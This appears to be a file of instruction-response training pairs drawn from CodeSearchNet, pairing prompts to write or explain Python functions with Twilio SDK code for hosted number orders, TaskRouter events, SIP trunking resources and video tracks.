{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = AssignedAddOnContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                resource_sid=self._solution['resource_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the assigned add on"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nretrieve a single page of HostedNumberOrderInstance records from the API. Request is executed immediately", "response": "def page(self, status=values.unset, phone_number=values.unset,\n             incoming_phone_number_sid=values.unset, friendly_name=values.unset,\n             unique_name=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of HostedNumberOrderInstance records from the API.\n        Request is executed immediately\n\n        :param HostedNumberOrderInstance.Status status: The Status of this HostedNumberOrder.\n        :param unicode phone_number: An E164 formatted phone number.\n        :param unicode incoming_phone_number_sid: IncomingPhoneNumber sid.\n        :param unicode friendly_name: A human readable description of this resource.\n        :param unicode unique_name: A unique, developer assigned name of this HostedNumberOrder.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of HostedNumberOrderInstance\n        :rtype: twilio.rest.preview.hosted_numbers.hosted_number_order.HostedNumberOrderPage\n        \"\"\"\n        params = values.of({\n            'Status': status,\n            'PhoneNumber': phone_number,\n            'IncomingPhoneNumberSid': incoming_phone_number_sid,\n            'FriendlyName': friendly_name,\n            'UniqueName': unique_name,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return HostedNumberOrderPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new Hosted Number Order Instance", "response": "def create(self, phone_number, sms_capability, account_sid=values.unset,\n               friendly_name=values.unset, unique_name=values.unset,\n               cc_emails=values.unset, sms_url=values.unset,\n               sms_method=values.unset, sms_fallback_url=values.unset,\n               sms_fallback_method=values.unset, status_callback_url=values.unset,\n               status_callback_method=values.unset,\n               sms_application_sid=values.unset, address_sid=values.unset,\n               email=values.unset, verification_type=values.unset,\n               verification_document_sid=values.unset):\n        \"\"\"\n        Create a new HostedNumberOrderInstance\n\n        :param unicode phone_number: An E164 formatted phone number.\n        :param bool sms_capability: Specify SMS capability to host.\n        :param unicode account_sid: Account Sid.\n        :param unicode friendly_name: A human readable description of this resource.\n        :param unicode unique_name: A unique, developer assigned name of this HostedNumberOrder.\n        :param unicode cc_emails: A list of emails.\n        :param unicode sms_url: SMS URL.\n        :param unicode sms_method: SMS Method.\n        :param unicode sms_fallback_url: SMS Fallback URL.\n        :param unicode sms_fallback_method: SMS Fallback Method.\n        :param unicode status_callback_url: Status Callback URL.\n        :param unicode status_callback_method: Status Callback Method.\n        :param unicode sms_application_sid: SMS Application Sid.\n        :param unicode address_sid: Address sid.\n        :param unicode email: Email.\n        :param HostedNumberOrderInstance.VerificationType verification_type: Verification Type.\n        :param unicode verification_document_sid: Verification Document Sid\n\n        :returns: Newly created HostedNumberOrderInstance\n        :rtype: twilio.rest.preview.hosted_numbers.hosted_number_order.HostedNumberOrderInstance\n        \"\"\"\n        data = values.of({\n            'PhoneNumber': phone_number,\n            'SmsCapability': sms_capability,\n            'AccountSid': account_sid,\n            'FriendlyName': friendly_name,\n            'UniqueName': unique_name,\n            'CcEmails': serialize.map(cc_emails, lambda e: e),\n            'SmsUrl': sms_url,\n            'SmsMethod': sms_method,\n            'SmsFallbackUrl': sms_fallback_url,\n            'SmsFallbackMethod': sms_fallback_method,\n            'StatusCallbackUrl': status_callback_url,\n            'StatusCallbackMethod': status_callback_method,\n            'SmsApplicationSid': sms_application_sid,\n            'AddressSid': address_sid,\n            'Email': email,\n            'VerificationType': verification_type,\n            'VerificationDocumentSid': verification_document_sid,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return HostedNumberOrderInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the HostedNumberOrderInstance :param unicode friendly_name: A human readable description of this resource. :param unicode unique_name: A unique, developer assigned name of this HostedNumberOrder. :param unicode email: Email. :param unicode cc_emails: A list of emails. :param HostedNumberOrderInstance.Status status: The Status of this HostedNumberOrder. :param unicode verification_code: A verification code. :param HostedNumberOrderInstance.VerificationType verification_type: Verification Type. :param unicode verification_document_sid: Verification Document Sid :param unicode extension: Digits to dial after connecting the verification call. :param unicode call_delay: The number of seconds, between 0 and 60, to delay before initiating the verification call. :returns: Updated HostedNumberOrderInstance :rtype: twilio.rest.preview.hosted_numbers.hosted_number_order.HostedNumberOrderInstance", "response": "def update(self, friendly_name=values.unset, unique_name=values.unset,\n               email=values.unset, cc_emails=values.unset, status=values.unset,\n               verification_code=values.unset, verification_type=values.unset,\n               verification_document_sid=values.unset, extension=values.unset,\n               call_delay=values.unset):\n        \"\"\"\n        Update the HostedNumberOrderInstance\n\n        :param unicode friendly_name: A human readable description of this resource.\n        :param unicode unique_name: A unique, developer assigned name of this HostedNumberOrder.\n        :param unicode email: Email.\n        :param unicode cc_emails: A list of emails.\n        :param HostedNumberOrderInstance.Status status: The Status of this HostedNumberOrder.\n        :param unicode verification_code: A verification code.\n        :param HostedNumberOrderInstance.VerificationType verification_type: Verification Type.\n        :param unicode verification_document_sid: Verification Document Sid\n        :param unicode extension: Digits to dial after connecting the verification call.\n        :param unicode call_delay: The number of seconds, between 0 and 60, to delay before initiating the verification call.\n\n        :returns: Updated HostedNumberOrderInstance\n        :rtype: twilio.rest.preview.hosted_numbers.hosted_number_order.HostedNumberOrderInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'UniqueName': unique_name,\n            'Email': email,\n            'CcEmails': serialize.map(cc_emails, lambda e: e),\n            'Status': status,\n            'VerificationCode': verification_code,\n            'VerificationType': verification_type,\n            'VerificationDocumentSid': verification_document_sid,\n            'Extension': extension,\n            'CallDelay': call_delay,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return HostedNumberOrderInstance(self._version, payload, sid=self._solution['sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = HostedNumberOrderContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the Hosted Number Order Instance", "response": "def update(self, friendly_name=values.unset, unique_name=values.unset,\n               email=values.unset, cc_emails=values.unset, status=values.unset,\n               verification_code=values.unset, verification_type=values.unset,\n               verification_document_sid=values.unset, extension=values.unset,\n               call_delay=values.unset):\n        \"\"\"\n        Update the HostedNumberOrderInstance\n\n        :param unicode friendly_name: A human readable description of this resource.\n        :param unicode unique_name: A unique, developer assigned name of this HostedNumberOrder.\n        :param unicode email: Email.\n        :param unicode cc_emails: A list of emails.\n        :param HostedNumberOrderInstance.Status status: The Status of this HostedNumberOrder.\n        :param unicode verification_code: A verification code.\n        :param HostedNumberOrderInstance.VerificationType verification_type: Verification Type.\n        :param unicode verification_document_sid: Verification Document Sid\n        :param unicode extension: Digits to dial after connecting the verification call.\n        :param unicode call_delay: The number of seconds, between 0 and 60, to delay before initiating the verification call.\n\n        :returns: Updated HostedNumberOrderInstance\n        :rtype: twilio.rest.preview.hosted_numbers.hosted_number_order.HostedNumberOrderInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            unique_name=unique_name,\n            email=email,\n            cc_emails=cc_emails,\n            status=status,\n            verification_code=verification_code,\n            verification_type=verification_type,\n            verification_document_sid=verification_document_sid,\n            extension=extension,\n            call_delay=call_delay,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef entities(self):\n        if self._entities is None:\n            self._entities = EntityList(self._version, service_sid=self._solution['sid'], )\n        return self._entities", "response": "Access the entities\n\n        :returns: twilio.rest.authy.v1.service.entity.EntityList\n        :rtype: twilio.rest.authy.v1.service.entity.EntityList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of WorkersRealTimeStatisticsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of WorkersRealTimeStatisticsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.workers_real_time_statistics.WorkersRealTimeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_real_time_statistics.WorkersRealTimeStatisticsInstance\n        \"\"\"\n        return WorkersRealTimeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fetch(self, task_channel=values.unset):\n        params = values.of({'TaskChannel': task_channel, })\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return WorkersRealTimeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )", "response": "Fetch a WorkersRealTimeStatisticsInstance\n\n        :param unicode task_channel: Filter cumulative statistics by TaskChannel.\n\n        :returns: Fetched WorkersRealTimeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_real_time_statistics.WorkersRealTimeStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = WorkersRealTimeStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the availabe"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nretrieve a single page of LocalInstance records from the API. Request is executed immediately", "response": "def page(self, beta=values.unset, friendly_name=values.unset,\n             phone_number=values.unset, origin=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of LocalInstance records from the API.\n        Request is executed immediately\n\n        :param bool beta: Whether to include new phone numbers\n        :param unicode friendly_name: A string that identifies the resources to read\n        :param unicode phone_number: The phone numbers of the resources to read\n        :param unicode origin: Include phone numbers based on their origin. By default, phone numbers of all origin are included.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of LocalInstance\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.local.LocalPage\n        \"\"\"\n        params = values.of({\n            'Beta': beta,\n            'FriendlyName': friendly_name,\n            'PhoneNumber': phone_number,\n            'Origin': origin,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return LocalPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return LocalInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of LocalInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a AuthCallsIpAccessControlListMappingContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_ip_access_control_list_mapping.AuthCallsIpAccessControlListMappingContext :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_ip_access_control_list_mapping.AuthCallsIpAccessControlListMappingContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a AuthCallsIpAccessControlListMappingContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_ip_access_control_list_mapping.AuthCallsIpAccessControlListMappingContext\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_ip_access_control_list_mapping.AuthCallsIpAccessControlListMappingContext\n        \"\"\"\n        return AuthCallsIpAccessControlListMappingContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_instance(self, payload):\n        return AuthCallsIpAccessControlListMappingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )", "response": "Build an instance of AuthCallsIpAccessControlListMappingInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create(self, ip_access_control_list_sid):\n        data = values.of({'IpAccessControlListSid': ip_access_control_list_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return IpAccessControlListInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )", "response": "Create a new IpAccessControlListInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get(self, sid):\n        return IpAccessControlListContext(self._version, trunk_sid=self._solution['trunk_sid'], sid=sid, )", "response": "Constructs a IpAccessControlListContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.trunking.v1.trunk.ip_access_control_list.IpAccessControlListContext\n        :rtype: twilio.rest.trunking.v1.trunk.ip_access_control_list.IpAccessControlListContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds an instance of IpAccessControlListInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of IpAccessControlListInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.trunking.v1.trunk.ip_access_control_list.IpAccessControlListInstance\n        :rtype: twilio.rest.trunking.v1.trunk.ip_access_control_list.IpAccessControlListInstance\n        \"\"\"\n        return IpAccessControlListInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = IpAccessControlListContext(\n                self._version,\n                trunk_sid=self._solution['trunk_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nstreams the SubscribedTrackInstance records from the API as a generator.", "response": "def stream(self, date_created_after=values.unset,\n               date_created_before=values.unset, track=values.unset,\n               publisher=values.unset, kind=values.unset, limit=None,\n               page_size=None):\n        \"\"\"\n        Streams SubscribedTrackInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param datetime date_created_after: The date_created_after\n        :param datetime date_created_before: The date_created_before\n        :param unicode track: The track\n        :param unicode publisher: The publisher\n        :param SubscribedTrackInstance.Kind kind: The kind\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.video.v1.room.room_participant.room_participant_subscribed_track.SubscribedTrackInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            date_created_after=date_created_after,\n            date_created_before=date_created_before,\n            track=track,\n            publisher=publisher,\n            kind=kind,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nstreams the SubscribedTrackInstance records from the API as a list.", "response": "def list(self, date_created_after=values.unset,\n             date_created_before=values.unset, track=values.unset,\n             publisher=values.unset, kind=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists SubscribedTrackInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param datetime date_created_after: The date_created_after\n        :param datetime date_created_before: The date_created_before\n        :param unicode track: The track\n        :param unicode publisher: The publisher\n        :param SubscribedTrackInstance.Kind kind: The kind\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.video.v1.room.room_participant.room_participant_subscribed_track.SubscribedTrackInstance]\n        \"\"\"\n        return list(self.stream(\n            date_created_after=date_created_after,\n            date_created_before=date_created_before,\n            track=track,\n            publisher=publisher,\n            kind=kind,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nretrieve a single page of SubscribedTrackInstance records from the API. Request is executed immediately", "response": "def page(self, date_created_after=values.unset,\n             date_created_before=values.unset, track=values.unset,\n             publisher=values.unset, kind=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of SubscribedTrackInstance records from the API.\n        Request is executed immediately\n\n        :param datetime date_created_after: The date_created_after\n        :param datetime date_created_before: The date_created_before\n        :param unicode track: The track\n        :param unicode publisher: The publisher\n        :param SubscribedTrackInstance.Kind kind: The kind\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of SubscribedTrackInstance\n        :rtype: twilio.rest.video.v1.room.room_participant.room_participant_subscribed_track.SubscribedTrackPage\n        \"\"\"\n        params = values.of({\n            'DateCreatedAfter': serialize.iso8601_datetime(date_created_after),\n            'DateCreatedBefore': serialize.iso8601_datetime(date_created_before),\n            'Track': track,\n            'Publisher': publisher,\n            'Kind': kind,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SubscribedTrackPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, track=values.unset, publisher=values.unset, kind=values.unset,\n               status=values.unset):\n        \"\"\"\n        Update the SubscribedTrackInstance\n\n        :param unicode track: The track\n        :param unicode publisher: The publisher\n        :param SubscribedTrackInstance.Kind kind: The kind\n        :param SubscribedTrackInstance.Status status: The status\n\n        :returns: Updated SubscribedTrackInstance\n        :rtype: twilio.rest.video.v1.room.room_participant.room_participant_subscribed_track.SubscribedTrackInstance\n        \"\"\"\n        data = values.of({'Track': track, 'Publisher': publisher, 'Kind': kind, 'Status': status, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SubscribedTrackInstance(\n            self._version,\n            payload,\n            room_sid=self._solution['room_sid'],\n            subscriber_sid=self._solution['subscriber_sid'],\n        )", "response": "Update the SubscribedTrackInstance\n\n        :param unicode track: The track\n        :param unicode publisher: The publisher\n        :param SubscribedTrackInstance.Kind kind: The kind\n        :param SubscribedTrackInstance.Status status: The status\n\n        :returns: Updated SubscribedTrackInstance\n        :rtype: twilio.rest.video.v1.room.room_participant.room_participant_subscribed_track.SubscribedTrackInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_instance(self, payload):\n        return SubscribedTrackInstance(\n            self._version,\n            payload,\n            room_sid=self._solution['room_sid'],\n            subscriber_sid=self._solution['subscriber_sid'],\n        )", "response": "Build an instance of SubscribedTrackInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nstream EventInstance records from the TaskRouter API as a generator. This operation lazily loads records as efficiently as possible until limit is reached.", "response": "def stream(self, end_date=values.unset, event_type=values.unset,\n               minutes=values.unset, reservation_sid=values.unset,\n               start_date=values.unset, task_queue_sid=values.unset,\n               task_sid=values.unset, worker_sid=values.unset,\n               workflow_sid=values.unset, task_channel=values.unset,\n               sid=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams EventInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param datetime end_date: Filter events by an end date.\n        :param unicode event_type: Filter events by those of a certain event type\n        :param unicode minutes: Filter events by up to 'x' minutes in the past.\n        :param unicode reservation_sid: Filter events by those pertaining to a particular reservation\n        :param datetime start_date: Filter events by a start date.\n        :param unicode task_queue_sid: Filter events by those pertaining to a particular queue\n        :param unicode task_sid: Filter events by those pertaining to a particular task\n        :param unicode worker_sid: Filter events by those pertaining to a particular worker\n        :param unicode workflow_sid: Filter events by those pertaining to a particular workflow\n        :param unicode task_channel: Filter events by those pertaining to a particular task channel\n        :param unicode sid: Filter events by those pertaining to a particular event\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.event.EventInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            end_date=end_date,\n            event_type=event_type,\n            minutes=minutes,\n            reservation_sid=reservation_sid,\n            start_date=start_date,\n            task_queue_sid=task_queue_sid,\n            task_sid=task_sid,\n            worker_sid=worker_sid,\n            workflow_sid=workflow_sid,\n            task_channel=task_channel,\n            sid=sid,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list(self, end_date=values.unset, event_type=values.unset,\n             minutes=values.unset, reservation_sid=values.unset,\n             start_date=values.unset, task_queue_sid=values.unset,\n             task_sid=values.unset, worker_sid=values.unset,\n             workflow_sid=values.unset, task_channel=values.unset, sid=values.unset,\n             limit=None, page_size=None):\n        \"\"\"\n        Lists EventInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param datetime end_date: Filter events by an end date.\n        :param unicode event_type: Filter events by those of a certain event type\n        :param unicode minutes: Filter events by up to 'x' minutes in the past.\n        :param unicode reservation_sid: Filter events by those pertaining to a particular reservation\n        :param datetime start_date: Filter events by a start date.\n        :param unicode task_queue_sid: Filter events by those pertaining to a particular queue\n        :param unicode task_sid: Filter events by those pertaining to a particular task\n        :param unicode worker_sid: Filter events by those pertaining to a particular worker\n        :param unicode workflow_sid: Filter events by those pertaining to a particular workflow\n        :param unicode task_channel: Filter events by those pertaining to a particular task channel\n        :param unicode sid: Filter events by those pertaining to a particular event\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.event.EventInstance]\n        \"\"\"\n        return list(self.stream(\n            end_date=end_date,\n            event_type=event_type,\n            minutes=minutes,\n            reservation_sid=reservation_sid,\n            start_date=start_date,\n            task_queue_sid=task_queue_sid,\n            task_sid=task_sid,\n            worker_sid=worker_sid,\n            workflow_sid=workflow_sid,\n            task_channel=task_channel,\n            sid=sid,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Fetches a list of EventInstance records from the TaskRouter API."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nretrieves a single page of EventInstance records from the TaskRouter API.", "response": "def page(self, end_date=values.unset, event_type=values.unset,\n             minutes=values.unset, reservation_sid=values.unset,\n             start_date=values.unset, task_queue_sid=values.unset,\n             task_sid=values.unset, worker_sid=values.unset,\n             workflow_sid=values.unset, task_channel=values.unset, sid=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of EventInstance records from the API.\n        Request is executed immediately\n\n        :param datetime end_date: Filter events by an end date.\n        :param unicode event_type: Filter events by those of a certain event type\n        :param unicode minutes: Filter events by up to 'x' minutes in the past.\n        :param unicode reservation_sid: Filter events by those pertaining to a particular reservation\n        :param datetime start_date: Filter events by a start date.\n        :param unicode task_queue_sid: Filter events by those pertaining to a particular queue\n        :param unicode task_sid: Filter events by those pertaining to a particular task\n        :param unicode worker_sid: Filter events by those pertaining to a particular worker\n        :param unicode workflow_sid: Filter events by those pertaining to a particular workflow\n        :param unicode task_channel: Filter events by those pertaining to a particular task channel\n        :param unicode sid: Filter events by those pertaining to a particular event\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of EventInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.event.EventPage\n        \"\"\"\n        params = values.of({\n            'EndDate': serialize.iso8601_datetime(end_date),\n            'EventType': event_type,\n            'Minutes': minutes,\n            'ReservationSid': reservation_sid,\n            'StartDate': serialize.iso8601_datetime(start_date),\n            'TaskQueueSid': task_queue_sid,\n            'TaskSid': task_sid,\n            'WorkerSid': worker_sid,\n            'WorkflowSid': workflow_sid,\n            'TaskChannel': task_channel,\n            'Sid': sid,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return EventPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconstructs a EventContext :param sid: The sid :returns: twilio.rest.taskrouter.v1.workspace.event.EventContext :rtype: twilio.rest.taskrouter.v1.workspace.event.EventContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a EventContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.event.EventContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.event.EventContext\n        \"\"\"\n        return EventContext(self._version, workspace_sid=self._solution['workspace_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return EventInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Build an instance of EventInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = EventContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef message(self, body=None, to=None, from_=None, action=None, method=None,\n                status_callback=None, **kwargs):\n        \"\"\"\n        Create a <Message> element\n\n        :param body: Message Body\n        :param to: Phone Number to send Message to\n        :param from: Phone Number to send Message from\n        :param action: Action URL\n        :param method: Action URL Method\n        :param status_callback: Status callback URL. Deprecated in favor of action.\n        :param kwargs: additional attributes\n\n        :returns: <Message> element\n        \"\"\"\n        return self.nest(Message(\n            body=body,\n            to=to,\n            from_=from_,\n            action=action,\n            method=method,\n            status_callback=status_callback,\n            **kwargs\n        ))", "response": "Create a Message element with optional body to send to and optional from to."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create(self, sip_domain_sid):\n        data = values.of({'SipDomainSid': sip_domain_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TerminatingSipDomainInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )", "response": "Create a new TerminatingSipDomainInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconstructing a TerminatingSipDomainContext :param sid: The unique string that identifies the resource :returns: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainContext :rtype: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a TerminatingSipDomainContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainContext\n        :rtype: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainContext\n        \"\"\"\n        return TerminatingSipDomainContext(self._version, trunk_sid=self._solution['trunk_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds an instance of TerminatingSipDomainInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TerminatingSipDomainInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainInstance\n        :rtype: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainInstance\n        \"\"\"\n        return TerminatingSipDomainInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )"}
